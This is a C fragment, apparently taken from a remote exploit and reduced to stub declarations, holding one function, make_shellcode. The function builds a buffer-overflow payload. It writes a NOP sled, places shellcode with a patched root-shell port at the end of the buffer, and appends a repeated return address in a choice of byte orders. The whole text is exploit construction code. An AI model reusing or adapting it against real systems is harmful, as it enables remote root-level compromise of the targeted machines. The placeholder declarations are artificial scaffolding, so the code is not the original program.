
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int BUF_SIZE ;
 int RET_ADDR ;
 int htons (int ) ;
 int memcpy (scalar_t__,int ,scalar_t__) ;
 int memset (scalar_t__,int,int) ;
 int root_shell_port ;
 scalar_t__ sc ;
 int shellcode ;
 scalar_t__ strlen (int ) ;
 char* strstr (scalar_t__,char*) ;

void make_shellcode(int order) {
 char *ptr;
 int i;


 memset(sc, 0x90,BUF_SIZE);
 memcpy(sc + BUF_SIZE - (strlen(shellcode)+1), shellcode, strlen(shellcode));


 ptr=strstr(sc, "XX");
 *(ptr++)=htons(root_shell_port)&0xff;
 *ptr=(htons(root_shell_port)>>8)&0xff;

 ptr=(char *)sc+BUF_SIZE;
 for(i=0;i<BUF_SIZE-4;i+=4) {
  switch(order) {
   case 0:
    *(ptr++)=RET_ADDR&0xff;
           *(ptr++)=(RET_ADDR>>8)&0xff;
           *(ptr++)=(RET_ADDR>>16)&0xff;
           *(ptr++)=(RET_ADDR>>24)&0xff;
    break;
   case 1:
    *(ptr++)=(RET_ADDR>>16)&0xff;
           *(ptr++)=(RET_ADDR>>24)&0xff;
    *(ptr++)=RET_ADDR&0xff;
           *(ptr++)=(RET_ADDR>>8)&0xff;
    break;
  }
 }
 *ptr='\0';
}
